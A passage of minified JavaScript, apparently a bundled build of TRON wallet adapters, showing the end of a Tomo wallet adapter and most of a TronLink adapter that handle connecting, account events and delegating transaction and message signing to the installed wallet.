                            this.state === c.NotFound)
                                throw !1 !== this.config.openUrlWhenWalletNotFound && h() && window.open(this.url, "_blank"),
                                new p;
                            if (!this._wallet)
                                return;
                            if (this._connecting = !0,
                            !En())
                                throw new w("Cannot connect wallet.");
                            {
                                const e = this._wallet;
                                try {
                                    if (!(yield e.request({
                                        method: "eth_requestAccounts"
                                    })))
                                        throw new w("Tomo wallet is locked or no wallet account is avaliable.")
                                } catch (t) {
                                    throw new w(null == t ? void 0 : t.message,t)
                                }
                                const n = e.tronWeb && (null === (t = e.tronWeb.defaultAddress) || void 0 === t ? void 0 : t.base58) || "";
                                this.setAddress(n),
                                this.setState(c.Connected)
                            }
                            this.connected && this.emit("connect", this.address || "")
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        } finally {
                            this._connecting = !1
                        }
                    })
                }
                disconnect() {
                    return An(this, void 0, void 0, function*() {
                        this.state === c.Connected && (this.setAddress(null),
                        this.setState(c.Disconnect),
                        this.emit("disconnect"))
                    })
                }
                signTransaction(t, e) {
                    return An(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.sign(t, e)
                            } catch (t) {
                                throw t instanceof Error ? new v(t.message,t) : new v(t,new Error(t))
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                multiSign(t, e, n) {
                    return An(this, void 0, void 0, function*() {
                        try {
                            const r = yield this.checkAndGetWallet();
                            try {
                                return yield r.tronWeb.trx.multiSign(t, e, n)
                            } catch (t) {
                                throw t instanceof Error ? new v(t.message,t) : new v(t,new Error(t))
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                signMessage(t, e) {
                    return An(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.signMessageV2(t, e)
                            } catch (t) {
                                throw t instanceof Error ? new y(t.message,t) : new y(t,new Error(t))
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                checkAndGetWallet() {
                    return An(this, void 0, void 0, function*() {
                        if (yield this._checkWallet(),
                        this.state !== c.Connected)
                            throw new g;
                        const t = this._wallet;
                        if (!t || !t.tronWeb)
                            throw new g;
                        return t
                    })
                }
                _checkWallet() {
                    if (this.readyState === a.Found)
                        return Promise.resolve(!0);
                    if (this._checkPromise)
                        return this._checkPromise;
                    const t = Math.floor(20)
                      , e = Math.floor(this.config.checkTimeout / 100);
                    let n, r = 0;
                    return this._checkPromise = new Promise(i => {
                        const o = () => {
                            r++;
                            const o = r < t && !!u() && En();
                            (o || r > e) && (n && clearInterval(n),
                            this._readyState = o ? a.Found : a.NotFound,
                            this._updateWallet(),
                            this.emit("readyStateChanged", this.readyState),
                            i(o))
                        }
                        ;
                        n = setInterval(o, 100),
                        o()
                    }
                    ),
                    this._checkPromise
                }
                listenToEvents() {
                    var t;
                    this.stopEventListening(),
                    null === (t = this._wallet) || void 0 === t || t.on("accountsChanged", this.onAccountsChanged)
                }
                stopEventListening() {
                    this._wallet && this._wallet.removeListener("accountsChanged", this.onAccountsChanged)
                }
                checkForWalletReadyForApp() {
                    if (this.checkReadyInterval)
                        return;
                    let t = 0;
                    const e = Math.floor(this.config.checkTimeout / 200);
                    this.checkReadyInterval = setInterval( () => {
                        var n, r, i, o, s;
                        (null === (r = null === (n = window.tomo_wallet) || void 0 === n ? void 0 : n.tron) || void 0 === r ? void 0 : r.tronWeb) && (null === (s = null === (o = null === (i = window.tomo_wallet) || void 0 === i ? void 0 : i.tron) || void 0 === o ? void 0 : o.tronWeb) || void 0 === s ? void 0 : s.defaultAddress) ? (this.checkReadyInterval && clearInterval(this.checkReadyInterval),
                        this.checkReadyInterval = null,
                        this._updateWallet(),
                        this.emit("connect", this.address || "")) : t > e ? (this.checkReadyInterval && clearInterval(this.checkReadyInterval),
                        this.checkReadyInterval = null) : t++
                    }
                    , 200)
                }
                setAddress(t) {
                    this._address = t
                }
                setState(t) {
                    t !== this.state && (this._state = t,
                    this.emit("stateChanged", t))
                }
            }
            ,
            tronlink: new class extends d {
                constructor(t={}) {
                    super(),
                    this.name = "TronLink",
                    this.url = "https://www.tronlink.org/",
                    this.icon = "data:image/png;base64,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",
                    this._readyState = h() ? a.Loading : a.NotFound,
                    this._state = c.Loading,
                    this._supportNewTronProtocol = !1,
                    this._tronLinkMessageHandler = t => {
                        var e, n, r, i, o;
                        const s = null === (e = t.data) || void 0 === e ? void 0 : e.message;
                        if (s)
                            if ("accountsChanged" === s.action)
                                setTimeout( () => {
                                    var t;
                                    const e = this.address || "";
                                    if (null === (t = this._wallet) || void 0 === t ? void 0 : t.ready) {
                                        const t = s.data.address;
                                        this.setAddress(t),
                                        this.setState(c.Connected)
                                    } else
                                        this.setAddress(null),
                                        this.setState(c.Disconnect);
                                    this.emit("accountsChanged", this.address || "", e),
                                    !e && this.address ? this.emit("connect", this.address) : e && !this.address && this.emit("disconnect")
                                }
                                , 200);
                            else if ("setNode" === s.action)
                                this.emit("chainChanged", {
                                    chainId: (null === (r = null === (n = s.data) || void 0 === n ? void 0 : n.node) || void 0 === r ? void 0 : r.chainId) || ""
                                });
                            else if ("connect" === s.action) {
                                const t = (null === (o = null === (i = this._wallet.tronWeb) || void 0 === i ? void 0 : i.defaultAddress) || void 0 === o ? void 0 : o.base58) || "";
                                this.setAddress(t),
                                this.setState(c.Connected),
                                this.emit("connect", t)
                            } else
                                "disconnect" === s.action && (this.setAddress(null),
                                this.setState(c.Disconnect),
                                this.emit("disconnect"))
                    }
                    ,
                    this._onChainChanged = t => {
                        this.emit("chainChanged", t)
                    }
                    ,
                    this._onAccountsChanged = () => {
                        var t, e, n;
                        const r = this.address || ""
                          , i = (null === (t = this._wallet) || void 0 === t ? void 0 : t.tronWeb) && (null === (n = null === (e = this._wallet) || void 0 === e ? void 0 : e.tronWeb.defaultAddress) || void 0 === n ? void 0 : n.base58) || "";
                        if (i) {
                            const t = i;
                            this.setAddress(t),
                            this.setState(c.Connected)
                        } else
                            this.setAddress(null),
                            this.setState(c.Disconnect);
                        this.emit("accountsChanged", this.address || "", r),
                        !r && this.address ? this.emit("connect", this.address) : r && !this.address && this.emit("disconnect")
                    }
                    ,
                    this._checkPromise = null,
                    this._updateWallet = () => {
                        var t, e, n, r, i, o, s, l, d;
                        let h = this.state
                          , f = this.address;
                        if (u())
                            window.tronLink ? this._wallet = window.tronLink : this._wallet = {
                                ready: !!(null === (t = window.tronWeb) || void 0 === t ? void 0 : t.defaultAddress),
                                tronWeb: window.tronWeb,
                                request: () => Promise.resolve(!0)
                            },
                            f = (null === (n = null === (e = this._wallet.tronWeb) || void 0 === e ? void 0 : e.defaultAddress) || void 0 === n ? void 0 : n.base58) || null,
                            h = f ? c.Connected : c.Disconnect;
                        else if (window.tron && window.tron.isTronLink) {
                            this._supportNewTronProtocol = !0,
                            this._wallet = window.tron,
                            this._listenTronEvent();
                            try {
                                f = (null === (r = this._wallet) || void 0 === r ? void 0 : r.tronWeb) && (null === (o = null === (i = this._wallet.tronWeb) || void 0 === i ? void 0 : i.defaultAddress) || void 0 === o ? void 0 : o.base58) || null,
                                h = f ? c.Connected : c.Disconnect
                            } catch (t) {
                                return console.error("Unknow error: " + t, " Please install TronLink extension wallet."),
                                f = null,
                                h = c.Disconnect,
                                this._readyState = a.NotFound,
                                void this.emit("readyStateChanged", this.readyState)
                            }
                        } else
                            window.tronLink ? (this._wallet = window.tronLink,
                            this._listenTronLinkEvent(),
                            f = (null === (l = null === (s = this._wallet.tronWeb) || void 0 === s ? void 0 : s.defaultAddress) || void 0 === l ? void 0 : l.base58) || null,
                            h = this._wallet.ready ? c.Connected : c.Disconnect) : window.tronWeb ? (this._wallet = {
                                ready: window.tronWeb.ready,
                                tronWeb: window.tronWeb,
                                request: () => Promise.resolve(!0)
                            },
                            f = (null === (d = this._wallet.tronWeb.defaultAddress) || void 0 === d ? void 0 : d.base58) || null,
                            h = this._wallet.ready ? c.Connected : c.Disconnect) : (this._wallet = null,
                            f = null,
                            h = c.NotFound);
                        u() && h === c.Disconnect && this.checkForWalletReadyForApp(),
                        this.setAddress(f),
                        this.setState(h)
                    }
                    ,
                    this.checkReadyInterval = null;
                    const {checkTimeout: e=3e4, dappIcon: n="", dappName: r="", openUrlWhenWalletNotFound: i=!0, openTronLinkAppOnMobile: o=!0} = t;
                    if ("number" != typeof e)
                        throw new Error("[TronLinkAdapter] config.checkTimeout should be a number");
                    if (this.config = {
                        checkTimeout: e,
                        openTronLinkAppOnMobile: o,
                        openUrlWhenWalletNotFound: i,
                        dappIcon: n,
                        dappName: r
                    },
                    this._connecting = !1,
                    this._wallet = null,
                    this._address = null,
                    !h())
                        return this._readyState = a.NotFound,
                        void this.setState(c.NotFound);
                    yn() || u() && (window.tronLink || window.tronWeb) ? (this._readyState = a.Found,
                    this._updateWallet()) : this._checkWallet().then( () => {
                        this.connected && this.emit("connect", this.address || "")
                    }
                    )
                }
                get address() {
                    return this._address
                }
                get state() {
                    return this._state
                }
                get readyState() {
                    return this._readyState
                }
                get connecting() {
                    return this._connecting
                }
                network() {
                    return Mn(this, void 0, void 0, function*() {
                        var t;
                        try {
                            if (yield this._checkWallet(),
                            this.state !== c.Connected)
                                throw new g;
                            const e = (null === (t = this._wallet) || void 0 === t ? void 0 : t.tronWeb) || window.tronWeb;
                            if (!e)
                                throw new g;
                            try {
                                return yield In(e)
                            } catch (t) {
                                throw new N(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                connect() {
                    return Mn(this, void 0, void 0, function*() {
                        var t, e;
                        try {
                            if (this.checkIfOpenTronLink(),
                            this.connected || this.connecting)
                                return;
                            if (yield this._checkWallet(),
                            this.state === c.NotFound)
                                throw !1 !== this.config.openUrlWhenWalletNotFound && h() && window.open(this.url, "_blank"),
                                new p;
                            if (!this._wallet)
                                return;
                            if (this._connecting = !0,
                            this._supportNewTronProtocol) {
                                const t = this._wallet;
                                try {
                                    const e = (yield t.request({
                                        method: "eth_requestAccounts"
                                    }))[0];
                                    this.setAddress(e),
                                    this.setState(c.Connected),
                                    this._listenTronEvent(),
                                    this._wallet.tronWeb || (yield function(t) {
                                        return function(t, e, n, r) {
                                            return new (n || (n = Promise))(function(i, o) {
                                                function s(t) {
                                                    try {
                                                        c(r.next(t))
                                                    } catch (t) {
                                                        o(t)
                                                    }
                                                }
                                                function a(t) {
                                                    try {
                                                        c(r.throw(t))
                                                    } catch (t) {
                                                        o(t)
                                                    }
                                                }
                                                function c(t) {
                                                    var e;
                                                    t.done ? i(t.value) : (e = t.value,
                                                    e instanceof n ? e : new n(function(t) {
                                                        t(e)
                                                    }
                                                    )).then(s, a)
                                                }
                                                c((r = r.apply(t, e || [])).next())
                                            }
                                            )
                                        }(this, void 0, void 0, function*() {
                                            return new Promise( (e, n) => {
                                                const r = setInterval( () => {
                                                    t.tronWeb && (clearInterval(r),
                                                    clearTimeout(i),
                                                    e())
                                                }
                                                , 50)
                                                  , i = setTimeout( () => {
                                                    clearInterval(r),
                                                    n("`window.tron.tronweb` is not ready.")
                                                }
                                                , 2e3)
                                            }
                                            )
                                        })
                                    }(this._wallet))
                                } catch (t) {
                                    let e = (null == t ? void 0 : t.message) || t || "Connect TronLink wallet failed.";
                                    throw -32002 === t.code && (e = "The same DApp has already initiated a request to connect to TronLink wallet, and the pop-up window has not been closed."),
                                    4001 === t.code && (e = "The user rejected connection."),
                                    new w(e,t)
                                }
                            } else if (window.tronLink) {
                                const e = this._wallet;
                                try {
                                    const t = yield e.request({
                                        method: "tron_requestAccounts"
                                    });
                                    if (!t)
                                        throw new w("TronLink wallet is locked or no wallet account is avaliable.");
                                    if (4e3 === t.code)
                                        throw new w("The same DApp has already initiated a request to connect to TronLink wallet, and the pop-up window has not been closed.");
                                    if (4001 === t.code)
                                        throw new w("The user rejected connection.")
                                } catch (t) {
                                    throw new w(null == t ? void 0 : t.message,t)
                                }
                                const n = (null === (t = e.tronWeb.defaultAddress) || void 0 === t ? void 0 : t.base58) || "";
                                this.setAddress(n),
                                this.setState(c.Connected),
                                this._listenTronLinkEvent()
                            } else {
                                if (!window.tronWeb)
                                    throw new w("Cannot connect wallet.");
                                {
                                    const t = (null === (e = this._wallet.tronWeb.defaultAddress) || void 0 === e ? void 0 : e.base58) || "";
                                    this.setAddress(t),
                                    this.setState(c.Connected)
                                }
                            }
                            this.connected && this.emit("connect", this.address || "")
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        } finally {
                            this._connecting = !1
                        }
                    })
                }
                disconnect() {
                    return Mn(this, void 0, void 0, function*() {
                        this._supportNewTronProtocol ? this._stopListenTronEvent() : this._stopListenTronLinkEvent(),
                        this.state === c.Connected && (this.setAddress(null),
                        this.setState(c.Disconnect),
                        this.emit("disconnect"))
                    })
                }
                signTransaction(t, e) {
                    return Mn(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.sign(t, e)
                            } catch (t) {
                                throw t instanceof Error ? new v(t.message,t) : new v(t,new Error(t))
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                multiSign(t, e, n) {
                    return Mn(this, void 0, void 0, function*() {
                        try {
                            const r = yield this.checkAndGetWallet();
                            try {
                                return yield r.tronWeb.trx.multiSign(t, e, n)
                            } catch (t) {
                                throw t instanceof Error ? new v(t.message,t) : new v(t,new Error(t))
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                signMessage(t, e) {
                    return Mn(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.signMessageV2(t, e)
                            } catch (t) {
                                throw t instanceof Error ? new y(t.message,t) : new y(t,new Error(t))
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                switchChain(t) {
                    return Mn(this, void 0, void 0, function*() {
